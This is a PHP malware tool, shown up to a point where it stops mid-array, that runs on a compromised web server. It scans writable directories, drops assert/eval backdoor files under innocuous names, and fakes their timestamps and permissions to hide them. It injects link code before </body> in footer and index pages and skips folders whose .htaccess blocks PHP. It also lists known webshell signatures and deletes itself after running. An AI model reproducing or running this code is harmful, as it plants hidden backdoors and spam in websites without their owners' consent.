<?php

error_reporting(E_ALL);
ini_set('display_errors', 'On');
//error_reporting(0);
//ini_set('display_errors', 'Off');
@ini_set('memory_limit', '2048M');
@ini_set('set_time_limit', 0);
@ini_set('max_input_time', 0);
@ini_set('max_execution_time', 0);
@set_time_limit(0);

$this_dir = getcwd();
$this_file = __FILE__;

$link = explode("/", $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);
unset($link[count($link) - 1]);
$this_url = getScheme() . '://' . trim(implode("/", $link));

$this_url_file = getScheme() . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];

$this_os = getOs($this_dir); // !!!

$root_dir = trim(getRoot($this_dir));
$work_dir = getWorkDir($this_dir);

$this_dir_level = count(explode(DS, $this_dir));
if (OS == 'unix' && $this_dir_level > 1)
    $this_dir_level--;

$root_dir_level = count(explode(DS, $root_dir));
if (OS == 'unix' && $root_dir_level > 1)
    $root_dir_level--;

$work_dir_level = count(explode(DS, $work_dir));
if (OS == 'unix' && $work_dir_level > 1)
    $work_dir_level--;

$level_scan_plus = 4;


echo '<table border="2" cellpadding="2">';
echo '<tr>';

echo '<td valign="top">';
echo '<form action="" method="get">';
echo 'Dgh: <input type="checkbox" name="dgh_act" value="1" checked>dgh_active';
echo '<input type="checkbox" name="dgh_file_rand" value="1" checked>dgh_file_rand';
echo '<input type="checkbox" name="dgh_root" value="1">dgh_root<br>';
echo 'Lsh: <input type="checkbox" name="lsh_act" value="1" checked>lsh_active';
echo '<input type="checkbox" name="lsh_only_act" value="1">lsh_only_active<br>';
echo 'Suspected: <input type="checkbox" name="susp_act" value="1" checked>susp_active';
echo '<input type="checkbox" name="susp_str" value="1" checked> susp_str';
echo '<input type="checkbox" name="susp_regex" value="1" checked> susp_regex<br>';
echo 'Bd: <input type="checkbox" name="bd_act" value="1" checked>bd_active<br>';

echo 'Code Type: <input type="radio" name="code_type" value="assert" checked="checked" />Assert
        <input type="radio" name="code_type" value="eval">Eval<br>';

echo 'Use Files: <input type="radio" name="use_files" value="all" checked="checked" />All
<input type="radio" name="use_files" value="write"> Write<br>';

echo 'Level Scan: <input type="text" name="level_scan" size="10" value="' . (!empty($_GET['level_scan']) ? abs((int) $_GET['level_scan']) : ($root_dir_level + $level_scan_plus)) . '"><br>';
echo 'Level Work: <input type="text" name="level" size="10" value="' . (!empty($_GET['level']) ? abs((int) $_GET['level']) : $root_dir_level) . '"><br>';

echo 'Dirs ignore:<br>';
echo '<textarea rows="3" cols="35" name="dirs_ignore">' . (!empty($_GET['dirs_ignore']) ? $_GET['dirs_ignore'] : '') . '</textarea><br>';

echo '<input type="hidden" name="do" value="start">';
echo '<hr>';
echo '<input type="submit" value="START">';
echo '</form>';
echo '</td>';

echo '<td valign="top">';
echo '<form action="" method="get">';
echo '<input type="submit" value="EMPTY PAGE">';
echo '</form>';
echo '<hr>';
echo '<form action="" method="get">';
echo '<input type="hidden" name="do" value="server">';
echo '<input type="submit" value="SERVER INFO">';
echo '</form>';
echo '<form action="" method="get">';
echo '<input type="hidden" name="do" value="phpinfo">';
echo '<input type="submit" value="PHP INFO">';
echo '</form>';
echo '<hr>';
echo '<form action="" method="get">';
echo 'Level Scan: <input type="text" name="level_scan" size="5" value="' . (!empty($_GET['level_scan']) ? abs((int) $_GET['level_scan']) : ($root_dir_level + $level_scan_plus)) . '"><br>';
echo 'Level Work: <input type="text" name="level" size="5" value="' . (!empty($_GET['level']) ? abs((int) $_GET['level']) : $root_dir_level) . '"><br>';
echo '<input type="hidden" name="do" value="count_data">';
echo '<input type="submit" value="COUNT DATA">';
echo '</form>';
echo '<hr>';
echo '<form action="" method="get">';
echo '<input type="hidden" name="do" value="del">';
echo '<input type="submit" value="DELETE SPIDER">';
echo '</form>';
echo '</td>';

echo '<td valign="top">';
echo '[php_ver]' . phpversion() . '[/php_ver]';
echo '<hr>';
if (function_exists('assert')) {
    echo '[assert_exists]ok[/assert_exists]<br>';
//    assert(str_rot13("riny('echo \"[assert_work]ok[/assert_work]\";');"));
    @assert(str_rot13("riny('rpub \"[nffreg_jbex]bx[/nffreg_jbex]\";');"));
} else
    echo 'assert: not exists';
echo '<br>';
if (function_exists('eval'))
    echo '[eval_exists]ok[/eval_exists]';
else
    echo '[eval_exists]no[/eval_exists]';
echo '<br>';
eval('echo "[eval_work]ok[/eval_work]";');
echo '<br>';
echo '</td>';

echo '<tr>';
echo '</table>';

//------------------------------------------------------------------------------

echo '<hr>';
echo '[check]' . md5(uniqid()) . '[/check]<hr>';
echo '[spider]<br>';
echo '[http_host]' . $_SERVER['HTTP_HOST'] . '[/http_host]<br>';
echo '[server_addr]' . (!empty($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : (!empty($_SERVER['LOCAL_ADDR']) ? $_SERVER['LOCAL_ADDR'] : 'unknown')) . '[/server_addr]<br>';
echo '[this_dir]' . $this_dir . '[/this_dir] - [this_dir_level]' . $this_dir_level . '[/this_dir_level]<br>';
echo '[this_file]' . $this_file . '[/this_file]<br>';
echo '[this_url]' . $this_url . '[/this_url]<br>';
echo '[this_url_file]' . $this_url_file . '[/this_url_file]<br>';
echo '[this_os]' . $this_os . '[/this_os]';
echo '<hr>';
echo '[root_dir]' . $root_dir . '[/root_dir] - [root_dir_level]' . $root_dir_level . '[/root_dir_level]<br>';
echo '[work_dir]' . $work_dir . '[/work_dir] - [work_dir_level]' . $work_dir_level . '[/work_dir_level]';
echo '<hr>';

// -----------------------------------------------------------------------------

$dirs = array('all' => array(), 'write' => array(), 'read' => array());
$files = array('all' => array(), 'write' => array(), 'read' => array());

// -----------------------------------------------------------------------------

if (isset($_GET['do']) && $_GET['do'] == 'server') {
    print_arr($_SERVER);
    exit;
}
if (isset($_GET['do']) && $_GET['do'] == 'phpinfo') {
    phpinfo();
    exit;
}
if (isset($_GET['do']) && $_GET['do'] == 'del') {
    @unlink(__FILE__);
    die('THIS FILE: DELETE');
}
if (isset($_GET['do']) && @$_GET['do'] == 'count_data') {
    list($dirs, $files) = @getAll($work_dir, $dirs, $files); //all files and dirs

    echo '[dirs_count_all]' . count($dirs['all']) . '[/dirs_count_all] - ';
    echo '[dirs_count_read]' . count($dirs['read']) . '[/dirs_count_read] - ';
    echo '[dirs_count_write]' . count($dirs['write']) . '[/dirs_count_write]<br>';
    echo '[files_count_all]' . count($files['all']) . '[/files_count_all] - ';
    echo '[files_count_read]' . count($files['read']) . '[/files_count_read] - ';
    echo '[files_count_write]' . count($files['write']) . '[/files_count_write]';
    die();
}
if (!isset($_GET['do']) && @$_GET['do'] !== 'start')
    die('NO START');

echo '<hr>';

// -----------------------------------------------------------------------------
//
// dgh_act
$dgh_act = false;
$dgh_root = false;
$dgh_file_rand = false;
$dgh_check = false;
if (isset($_GET['dgh_act']) && $_GET['dgh_act'] == '1') {
    $dgh_act = true;
    // dgh_root
    if (isset($_GET['dgh_root']) && $_GET['dgh_root'] == '1')
        $dgh_root = true;
    // dgh_file_rand
    if (isset($_GET['dgh_file_rand']) && $_GET['dgh_file_rand'] == '1')
        $dgh_file_rand = true;
}

// susp_act
$susp_act = false;
$susp_str = false;
$susp_regex = false;
if (isset($_GET['susp_act']) && $_GET['susp_act'] == '1') {
    $susp_act = true;
    if (isset($_GET['susp_str']) && $_GET['susp_str'] == '1')
        $susp_str = true;
    if (isset($_GET['susp_regex']) && $_GET['susp_regex'] == '1')
        $susp_regex = true;
}

// bd_act
$bd_act = false;
if (isset($_GET['bd_act']) && $_GET['bd_act'] == '1') {
    $bd_act = true;
}

// lsh_act
$lsh_act = false;
$lsh_only_act = false;
if (isset($_GET['lsh_act']) && $_GET['lsh_act'] == '1') {
    $lsh_act = true;
    // lsh_only_act
    if (isset($_GET['lsh_only_act']) && $_GET['lsh_only_act'] == '1') {
        $lsh_only_act = true;
        $susp_act = false;
        $dgh_act = false;
        $dgh_root = false;
        $bd_act = false;
    }
}

// code type
$code_type = 'assert';
if (!empty($_GET['code_type']) && $_GET['code_type'] == 'eval')
    $code_type = 'eval';

// use files
$use_files = 'all';
if (!empty($_GET['use_files']) && $_GET['use_files'] == 'write')
    $use_files = 'write';

// -----------------------------------------------------------------------------

echo '<hr>';

//list($dirs, $files) = @getAll($work_dir, $dirs, $files); //all files and dirs
//shuffle($dirs['all']);
//shuffle($dirs['write']);
//shuffle($dirs['read']);
//shuffle($files['all']);
//shuffle($files['write']);
//shuffle($files['read']);
//echo '<hr>';

$find_files = array();
$find_files_root = array();

$find_dirs = array();
$find_dirs_root = array();

$root_dirs = array();
$root_dirs_write = array();
//
// WORK ------------------------------------------------------------------------
// 
// Dgh in root_dir
if ($dgh_act !== false && $dgh_root !== false && (((OS == 'unix') &&
        @is_writable($root_dir)) || ((OS == 'windows') && @win_is_writable($root_dir)))) {
    $root_file_dgh = setDghToDir($root_dir, $root_dir, $code_type, $dgh_file_rand);
    if (!empty($root_file_dgh)) {
        $dgh_check = true;
//        $find_dirs_root[] = $root_file_dgh;
        $find_files_root[] = $root_file_dgh;
    }
}

// Dirs, Files
if (($dgh_act && !$dgh_check) || $lsh_act || $susp_act || $bd_act) {
    list($dirs, $files) = @getAll($work_dir, $dirs, $files); //all files and dirs
    shuffle($dirs['all']);
    shuffle($dirs['write']);
    shuffle($dirs['read']);
    shuffle($files['all']);
    shuffle($files['write']);
    shuffle($files['read']);

    echo '[dirs_count_all]' . count($dirs['all']) . '[/dirs_count_all] - ';
    echo '[dirs_count_read]' . count($dirs['read']) . '[/dirs_count_read] - ';
    echo '[dirs_count_write]' . count($dirs['write']) . '[/dirs_count_write]<br>';
    echo '[files_count_all]' . count($files['all']) . '[/files_count_all] - ';
    echo '[files_count_read]' . count($files['read']) . '[/files_count_read] - ';
    echo '[files_count_write]' . count($files['write']) . '[/files_count_write]';

    echo '<hr>';
}

// Use File Type
if ($use_files == 'write')
    $workfiles = $files['write'];
else
    $workfiles = $files['all'];

// Files
if ($lsh_act || $susp_act) {
    foreach ($workfiles as $file) {
        // No .php
        if (!@preg_match("#(\.php|\.phtml)$#i", $file))
            continue;

//        $content = @file_get_contents($file); // content
        //
        // Lsh
        if ($lsh_act && preg_match("#(footer([a-z0-9\-_]*)\.php|index([a-z0-9\-_]*)\.php|base([a-z0-9\-_]*)\.php)$#i", $file)) {
            $content = @file_get_contents($file); // content

            if (preg_match("#\</body\>[\S\s]*\</html\>#i", $content)) {
                list($_find_files, $_find_files_root) = setLshToFile($file, $content, $root_dir, $code_type);
                if (!empty($_find_files))
                    $find_files = array_merge($find_files, $_find_files);
                if (!empty($_find_files_root))
                    $find_files_root = array_merge($find_files_root, $_find_files_root);
            }
        }

        // susp_act
        if ($susp_act) {
            $content = @file_get_contents($file); // content

            if ($susp_str) {
                list($find_files_1, $find_files_root_1) = suspected($file, $content, $root_dir, 'str');
                if (!empty($find_files_1))
                    $find_files = array_merge($find_files, $find_files_1);
                if (!empty($find_files_root_1))
                    $find_files_root = array_merge($find_files_root, $find_files_root_1);
            }
            if ($susp_regex) {
                list($find_files_2, $find_files_root_2) = suspected($file, $content, $root_dir, 'regex');
                if (!empty($find_files_2))
                    $find_files = array_merge($find_files, $find_files_2);
                if (!empty($find_files_root_2))
                    $find_files_root = array_merge($find_files_root, $find_files_root_2);
            }
        }
    }
}

// root_dirs_write
if (($dgh_act && !$dgh_check) || $bd_act) {
    $root_dirs_write = getRootDirsWrite($dirs['write'], $root_dir);
    shuffle($root_dirs_write);
    if (empty($root_dirs_write)) {
        // ...beep
        echo '[root_dirs_write]0[/root_dirs_write]<hr>';
    }

    if (is_array($root_dirs_write) && !empty($root_dirs_write)) {
        echo '[root_dirs_write]' . count($root_dirs_write) . '[/root_dirs_write]<hr>';
    }

    foreach ($root_dirs_write as $rdw) {
        // dgh
        if ($dgh_act && !$dgh_check) {
            $root_file_dgh = setDghToDir($rdw, $root_dir, $code_type, $dgh_file_rand);
            if (!empty($root_file_dgh)) {
                $dgh_check = true;
//                $find_dirs_root[] = $root_file_dgh;
                $find_files_root[] = $root_file_dgh;
            }
        }
        // bd
        if ($bd_act) {
            
        }
    }
}

// END WORK --------------------------------------------------------------------

echo '<hr><hr><hr>';


print_arr($find_files);
print_arr($find_files_root);

print_arr($find_dirs);
print_arr($find_dirs_root);

echo '<hr>';

//print_arr($root_dirs);
//print_arr($root_dirs_write);
//echo '<hr>';
//print_arr($dirs['write']);


echo '<br>[result]success[/result]<br>';
@unlink(__FILE__);
echo '[/spider]';

// FUNC-------------------------------------------------------------------------

function getAll($dir, $dirs, $files)
{
    $level_scan = 1000;
    if (!empty($_GET['level_scan']))
        $level_scan = abs((int) $_GET['level_scan']);

    $dir_arr = explode(DS, $dir);
    if (OS == 'unix')
        unset($dir_arr[0]);

    $dir_ignore = false;
    $dirs_ignore = array();
    if (!empty($_GET['dirs_ignore'])) {
        $dirs_ignore = preg_split('/[\n\r]+/', $_GET['dirs_ignore']);

        foreach ($dirs_ignore as $di) {
            if (function_exists('mb_stripos')) {
                if (mb_stripos($dir, $di, 0, 'utf-8') !== false) {
                    $dir_ignore = true;
                    break;
                }
            } else {
                if (stripos($dir, $di) !== false) {
                    $dir_ignore = true;
                    break;
                }
            }
        }
    }


    if ((count($dir_arr) <= $level_scan) && !$dir_ignore) {

        foreach (@glob("$dir" . DS . "*") as $item) {
            if (@is_dir($item)) {
                if ((OS == 'unix' && @is_writable($item)) || (OS == 'windows' && @win_is_writable($item)))
                    $dirs['write'][] = $item;
                else
                    $dirs['read'][] = $item;
                $dirs['all'][] = $item;

                list($dirs, $files) = getAll($item, $dirs, $files);
            }
            // file
            else {
                if (preg_match("#(\.php|\.phtml)$#i", $item)) {

                    if (@is_writable($item))
                        $files['write'][] = $item;
                    else
                        $files['read'][] = $item;
                    $files['all'][] = $item;
                }

                list($dirs, $files) = getAll($item, $dirs, $files);
            }
        }
    }

    if (!empty($dirs['all']))
        $dirs['all'] = array_unique($dirs['all']);
    if (!empty($dirs['write']))
        $dirs['write'] = array_unique($dirs['write']);
    if (!empty($dirs['read']))
        $dirs['read'] = array_unique($dirs['read']);

    if (!empty($files['all']))
        $files['all'] = array_unique($files['all']);
    if (!empty($files['write']))
        $files['write'] = array_unique($files['write']);
    if (!empty($files['read']))
        $files['read'] = array_unique($files['read']);

    return array($dirs, $files);
}

function getRoot($this_dir)
{
    //$url_arr = explode("/", $_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']);
    $url_arr = explode(DS, $_SERVER['SCRIPT_NAME']);

    unset($url_arr[count($url_arr) - 1]);

    $url = implode(DS, $url_arr);
    if ($url == DS)
        return $this_dir;

    if (empty($url))
        return $this_dir;

    $pos = stripos($this_dir, $url);
    if ($pos === false)
        return $this_dir;

    $len = strlen($this_dir) - strlen($url);

    $root_dir = substr($this_dir, 0, $len);

    if (empty($root_dir))
        $root_dir = DS;

    return $root_dir;
}

function getUrl($file, $root_dir)
{
    $pos = stripos($file, $root_dir);
    if ($pos !== false) {
        $res = substr($file, strlen($root_dir));
        $res = str_replace("\\", "/", $res);
        return getScheme() . '://' . $_SERVER['HTTP_HOST'] . $res;
    } else {
        return null;
    }
}

function getWorkDir($this_dir)
{
    $work_dir = '';
    if (OS == 'unix')
        $work_dir .= '/';

    $work_this_dir = "";
    if (OS == 'unix')
        $work_this_dir .= '/';

    // work_dir
    $this_dir_arr = @explode(DS, $this_dir);
    if (OS == 'unix' && empty($this_dir_arr[0]))
        unset($this_dir_arr[0]);

    if (empty($_GET['level'])) {

        foreach ($this_dir_arr as $key => $tda) {
//        if (OS == 'unix' && $key == 0)
//            continue;

            if (!empty($tda)) {
                $work_this_dir .= $tda . DS;
                if (OS == 'unix' && @is_writable($work_this_dir)) {
                    $work_dir = $work_this_dir;
                    break;
                } elseif (OS == 'windows' && @win_is_writable($work_this_dir)) {
                    $work_dir = $work_this_dir;
                    break;
                }
            }
        }
    }
    // level work_dir
    else {
        $level = abs((int) $_GET['level']);

        foreach ($this_dir_arr as $tda_k => $tda_v) {

            if ($tda_k <= $level) {
                $work_dir .= $tda_v . DS;
            }
        }
    }

    if (OS == 'windows') {
        $work_dir = trim($work_dir, "/");
        $work_dir = trim($work_dir, "\\");
    }
    if (OS == 'unix') {
        $work_dir = rtrim($work_dir, "/");
        $work_dir = rtrim($work_dir, "\\");
    }


    return $work_dir;
}

function print_arr($arr)
{
    echo '<pre>';
    print_r($arr);
    echo '</pre>';
}

function perms($filename)
{
    return substr(decoct(fileperms($filename)), -3);
}

function getScheme()
{
    if (
            (isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) === 'on') ||
            (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') ||
            (isset($_SERVER['HTTP_FRONT_END_HTTPS']) && $_SERVER['HTTP_FRONT_END_HTTPS'] === 'on') ||
            (isset($_SERVER['REQUEST_SCHEME']) && $_SERVER['REQUEST_SCHEME'] === 'https')
    ) {
        return 'https';
    }
    return 'http';
}

function getOs($this_dir)
{
    $os = 'unix';

    if (stripos($this_dir, ":") !== false) {
        $os = 'windows';
        define('DS', '\\');
        define('OS', 'windows');
    } else {
        $os = 'unix';
        define('DS', '/');
        define('OS', 'unix');
    }

    return $os;
}

function getRootDirsWrite($dirs, $root_dir)
{
    $root_dirs = array();

    $dirs[] = $root_dir;

    $htaccess_temp = array(); // temp

    foreach ($dirs as $dir) {
        $perms = null;
        $arr = null;
        $str = null;

        // deny link            
        $deny_link = array(
            'admin',
//            DS . 'wp-includes',
//            DS . 'wp-content' . DS . 'plugins',
            DS . 'wp-admin',
            DS . 'application',
            DS . 'components',
            DS . 'administrator',
            DS . 'administration',
//            DS . 'includes',
            DS . 'libraries',
            DS . 'modules',
            DS . 'plugins',
            DS . 'xmlrpc',
            'phpmyadmin',
            DS . 'phpMyAdmin-357-english',
            DS . 'moodle',
            DS . 'warp',
            DS . 'cache',
            DS . 'supercache',
            DS . 'awstats',
            DS . 'tmp',
            DS . 'htpasswds',
            DS . 'etc',
            DS . 'cgi-bin',
            DS . 'webalizer',
            DS . 'scripts',
            DS . 'upgrade',
            DS . 'cp' . DS,
            DS . 'wp-content(old)',
            'zend',
        );

        // check deny link
        foreach ($deny_link as $dl) {
            if (function_exists('mb_stripos')) {
                if (mb_stripos($dir, $dl, 0, 'utf-8') !== false)
                    continue(2);
            } else {
                if (stripos($dir, $dl) !== false)
                    continue(2);
            }
        }



        // perms
//        $perms = abs((int) perms($dir));
//        if ($perms !== 777) {
//            if ($perms !== 755) {
//                continue;
//            }
//        }
        // in root_dir
        if (function_exists('mb_stripos')) {
            if (mb_stripos($dir, $root_dir, 0, 'utf-8') === false)
                continue;
        } else {
            if (stripos($dir, $root_dir) === false)
                continue;
        }


        /*
          // 5cea66664cd832b7d15f5b46e3310e1f
          # BEGIN WordPress

          RewriteEngine On
          RewriteBase /
          RewriteRule ^index\\.php$ - [L]
          RewriteCond %{REQUEST_FILENAME} !-f
          RewriteCond %{REQUEST_FILENAME} !-d
          RewriteRule . /index.php [L]

          # END WordPress
         */


        $htaccess_deny_from_all_md5 = array(
            '5cc8a02be988615b049f5abecba2f3a0', // deny from all
            '9bf7005254c213da54d6294b4b5a2f26', // <FilesMatch ".(phtml|php|PhP|php5|suspected)$"> Order Allow,Deny Deny from all </FilesMatch>
            'a68f27ef450893638f0c8a4430b58d41', // <FilesMatch ".(phtml|php|PhP|php5|suspected)$"> Order Allow,Deny Deny from all </FilesMatch>
            '588cda2316a73321ceb8ffd6cb42b4c0', // <IfModule mod_mime.c> <Files ~ \.(php|php3|php4|php5|php6|phtml|pl|asp|aspx|cgi|dll|exe|shtm|shtml|fcg|fcgi|fpl|asmx|pht|py|psp|rb|var)> SetHandler text/plain ForceType text/plain </Files> </IfModule> <IfModule mod_php5.c> p_flag engine off </IfModule> 
            'cd3bb136e005c51084b57070606aae46', // <FilesMatch ".*\.(phtml|php)$"> Order Allow,Deny Deny from all </FilesMatch> <FilesMatch "(index).php$"> Order Allow,Deny Allow from all </FilesMatch>
            '5411dec535637e9cffcb637ba94ff545', // <Files *.php> deny from all </Files>
            '39747063710e09d98976a6c82995b779', // <FilesMatch ".*\.(phtml|php)$"> Order Allow,Deny Deny from all </FilesMatch> <FilesMatch "(index).php$"> Order Allow,Deny Allow from all </FilesMatch>
            'f85bec2b8e9ac9ed18392f435fcaa854', // <FilesMatch ".*\.(phtml|php|PhP|php5|suspected)$"> Order Allow,Deny Deny from all </FilesMatch>
            'c403e13ba19ec56353e1681329aff6f4', // Order deny,allow Deny from all
            'cf10201a4fa5955ed2994d5f247721cf', // <Files *.*> Order Deny,Allow Deny from all </Files> <Files ~ "\.(js|css)$"> Order Allow,Deny Allow from all </Files>
			'c10a8b7a0848e4527c752618822a2857', // <FilesMatch ".*\.(phtml|php)$"> Order Allow,Deny Deny from all </FilesMatch>
			'b85ec55e00af30b731b28899ea17dd0a', // <FilesMatch ".*\.(php)$"> Deny from all </FilesMatch>
			'2cef781003c746ff00ec5fd27038f1b8', // <FilesMatch ".(py|exe|phtml|php|PhP|php5|suspected)$"> Order Allow,Deny Deny from all </FilesMatch>
			'29527fddea7e2bbfb03d37e460fa70e1', // <FilesMatch '.(php|php5|suspected|py|phtml)$'> Order allow,deny Deny from all </FilesMatch>
			'7957ff8125a1b86e3264156ca667d541', // <FilesMatch ".(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|phP|PhP|php5|suspected)$"> Order Allow,Deny Deny from all </FilesMatch>

        );

        //.htaccess 
        if (file_exists($dir . DS . '.htaccess')) {
            $ht = trim(@file_get_contents($dir . DS . '.htaccess'));
            $ht_md5 = md5($ht);
//            echo 'HTACCESS 1_1: ' . $dir . DS . '.htaccess' . ';' . $ht_md5 . '<br>';
            $ht_lower = trim(strtolower($ht));
//            if ($ht == 'deny from all' || $ht == 'Deny from all' ||
//                    $ht == 'Order deny,allow\nDeny from all' ||
//                    $ht == 'Order deny, allow\nDeny from all' ||
//                    $ht = '<Files *.php>\ndeny from all\n</Files>' ||
//                    $ht = '<FilesMatch ".*\.(phtml|php)$">\nOrder Allow,Deny\nDeny from all\n</FilesMatch>')
            if ($ht_lower == 'deny from all')
                continue;
//            if (stripos($ht, 'deny from all') !== false)
//                continue;
            // .htaccess hash
            if (in_array($ht_md5, $htaccess_deny_from_all_md5))
                continue;

//            echo 'HTACCESS 1_2: ' . $dir . DS . '.htaccess' . ';' . $ht_md5 . '<br>';
            if (!array_key_exists($ht_md5, $htaccess_temp))
                $htaccess_temp[$ht_md5] = $dir . DS . '.htaccess';
        }




        $arr = explode(DS, $dir);
        if (OS == 'unix' && empty($arr[0]))
            unset($arr[0]);
        foreach ($arr as $value) {
            $str .= DS . $value;
            if (OS == 'windows')
                $str = ltrim($str, DS);

            if (@file_exists($str . DS . '.htaccess')) {
                $ht = trim(@file_get_contents($str . DS . '.htaccess'));
                $ht_md5 = md5($ht);
//                echo 'HTACCESS 2_1: ' . $str . DS . '.htaccess' . ';' . $ht_md5 . '<br>';
                $ht_lower = trim(strtolower($ht));
//                if ($ht == 'deny from all' || $ht == 'Deny from all' ||
//                        $ht == 'Order deny,allow\nDeny from all' ||
//                        $ht == 'Order deny, allow\nDeny from all' ||
//                        $ht = '<Files *.php>\ndeny from all\n</Files>' ||
//                        $ht = '<FilesMatch ".*\.(phtml|php)$">\nOrder Allow,Deny\nDeny from all\n</FilesMatch>')
//                        
//                <FilesMatch ".(phtml|php|PhP|php5|suspected)$">
//                Order Allow,Deny
//                Deny from all
//                </FilesMatch>

                if ($ht_lower == 'deny from all')
                    continue(2);
//                if (stripos($ht, 'deny from all') !== false)
//                    continue(2);
                // .htaccess md5
                if (in_array($ht_md5, $htaccess_deny_from_all_md5))
                    continue(2);

//                echo 'HTACCESS 2_2: ' . $str . DS . '.htaccess' . ';' . $ht_md5 . '<br>';
                if (!array_key_exists($ht_md5, $htaccess_temp))
                    $htaccess_temp[$ht_md5] = $str . DS . '.htaccess';
            }
        }

        $root_dirs[] = $dir;
    }

    print_arr($htaccess_temp);

    $root_dirs = array_unique($root_dirs);
    return $root_dirs;
}

function setDghToDir($dir, $root_dir, $code_type = 'assert', $rand_name = true)
{
    $res = null;
    if ($code_type == 'assert')
        $data = getData('dgh_assert');
    elseif ($code_type == 'eval')
        $data = getData('dgh_eval');

    $files = array('index.php', 'index.html', 'wp-config.php', 'wp-settings.php', 'wp-login.php');
    shuffle($files);
    foreach ($files as $file) {
        $file = $dir . DS . $file;
        if (file_exists($file)) {
            if (@filemtime($file))
                $mtime = @filemtime($file);
            break;
        }
    }

    $names = array('title.php', 'circle.php', 'set.php', 'receipt.php', 'violence.php',
        'divide.php', 'curved.php', 'print.php', 'sink.php', 'prison.php', 'block.php');
    shuffle($names);

    if ($rand_name === false) {
        foreach ($names as $name) {
            $path = $dir . DS . $name;
            if (!file_exists($path)) {
                @file_put_contents($path, $data);
                //touch
                if (!empty($mtime))
                    @touch($path, $mtime);
                //@chmod($fname, 0666);  
                @chmod($path, 0444);

                $url = getUrl($dir . DS . $name, $root_dir);

                $res = '[root_file_dgh]' . $url . '[/root_file_dgh]';
                break;
            }
        }
    }
    // rand_name
    else {
        $name = rand_str(mt_rand(4, 10)) . '.php';
        $path = $dir . DS . $name;
        if (!file_exists($path)) {
            @file_put_contents($path, $data);
            //touch
            if (!empty($mtime))
                @touch($path, $mtime);
            //@chmod($fname, 0666);  
            @chmod($path, 0444);


            $url = getUrl($dir . DS . $name, $root_dir);

            $res = '[root_file_dgh]' . $url . '[/root_file_dgh]';
            ;
        }
    }

    return $res;
}

function setLshToFile($file, $content, $root_dir, $code_type = 'assert')
{
    $pos = false;
    $pos2 = false;
    $find_files = array();
    $find_files_root = array();

    if (preg_match("#\</body\>[\S\s]*\</html\>#i", $content) &&
            preg_match("#(footer([a-z0-9\-_]*)\.php|index([a-z0-9\-_]*)\.php|base([a-z0-9\-_]*)\.php)$#i", $file)) {

        // deny content
        $deny = array(
            '<html><body bgcolor="#FFFFFF"></body></html>',
            '</head><body></body></html>',
            '<html>\n<body bgcolor=\"#FFFFFF\">\n</body>\n</html>',
            '<html><body bgcolor=\"#FFFFFF\"></body></html>',
            '</tr></table></div></body></html>',
            '</head><body>%s</body></html>'
        );
        foreach ($deny as $value) {
            $pos = stripos($content, $value);
            if ($pos !== false)
                break;
        }

        // deny link        
        $deny_link = array(
            DS . 'wp-includes',
            DS . 'wp-content' . DS . 'plugins',
            DS . 'wp-admin',
            DS . 'application',
            DS . 'applications',
            DS . 'components',
            DS . 'administrator',
            DS . 'includes',
            DS . 'libraries',
            DS . 'modules',
            DS . 'plugins',
            DS . 'xmlrpc',
            'phpmyadmin',
            DS . 'phpMyAdmin-357-english',
            DS . 'moodle',
            DS . 'warp'
        );

        foreach ($deny_link as $value) {
            $pos2 = stripos($file, $value);
            if ($pos2 !== false)
                break;
        }

        if ($pos !== false)
            return array($find_files, $find_files_root);
        if ($pos2 !== false)
            return array($find_files, $find_files_root);

        $links_code_arr = getData('lsh_code_arr');
        foreach ($links_code_arr as $lca) {
            $pos = stripos($content, $lca);
            if ($pos !== false)
                break;
        }

        if ($pos === false) {
            //time
            if (@filemtime($file))
                $time = @filemtime($file);

            if ($code_type == 'assert')
                $lsh = getData('lsh_assert');
            elseif ($code_type == 'eval')
                $lsh = getData('lsh_eval');

            $content = preg_replace("#\</body\>#i", "$lsh\n</body>", $content);

            if ((OS == 'unix' && !@is_writable($file)) || (OS == 'windows' && !@win_is_writable($file))) {
                @chmod($file, 0755);
            }

            if ((OS == 'unix' && @is_writable($file)) || (OS == 'windows' && @win_is_writable($file))) {
                $fp = fopen($file, "w+");
                $ok = fwrite($fp, $content);
                if ($ok) {
                    $find_files[] = '[file_links_good]' . $file . '[/file_links_good]';

                    if (stripos($file, $root_dir) !== false) {
                        $url = getUrl($file, $root_dir);
                        $find_files_root[] = '[root_file_links_good]' . $url . '[/root_file_links_good]';
                    }
                } else {
                    $find_files[] = '[file_links_bad]' . $file . '[/file_links_bad]';
                }
                fclose($fp);

                //touch
                if ($time)
                    @touch($file, $time);
            }
        }
        //code links yes
        else {
            $find_files[] = '[file_links_yes]' . $file . '[/file_links_yes]';

            if (stripos($file, $root_dir) !== false) {
                $url = getUrl($file, $root_dir);
                $find_files_root[] = '[root_file_links_yes]' . $url . '[/root_file_links_yes]';
            }
        }
        // </body></html>  

        return array($find_files, $find_files_root);
    }
}

function suspected($file, $content, $root_dir, $type = 'str')
{
    $find_files = array();
    $find_files_root = array();

    if (empty($content))
        return array($find_files, $find_files_root);

    $suspected = array(
        'str' => array(
//            100 => '',
            200 => '"b" . "a" . "s" . "e" . "6" . "4" . "_" . "d" . "e" . "c" . "o" . "d" . "e"',
            201 => '"g" . "z" . "u" . "n" . "c" . "o" . "m" . "p" . "r" . "e" . "s" . "s"',
//            300 => '',
            //
            5000 => '/*** WebShellOrb 2.6 - With PHP 7 ***/',
            5001 => '</head><body> <fieldset class="head"><table class="head"> <tr><th style="width:125px">Server address :</th>',
            5002 => '<a href="#top">UP!</a></td><td align="center">p.a.s.',
            5003 => '<a href="http://r57.biz">',
            5004 => '<button type="submit" name="action" value="antisafe">Anti SafeMode</button>',
            5005 => '<center><input type=password name=x><input type=submit value=\'\'></center></address>',
            5006 => '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">',
            5007 => '<form action="" method="post"><input type="text" name="___" value=""/><input type="submit" value="&gt;"/>',
            5008 => '<form action="" method="post">login : <input type="text" name="',
            5009 => '<form method="POST" action="" enctype="multipart/form-data"><input type="file" name="image"><input type="Submit" name="Submit" value="Submit"></form>',
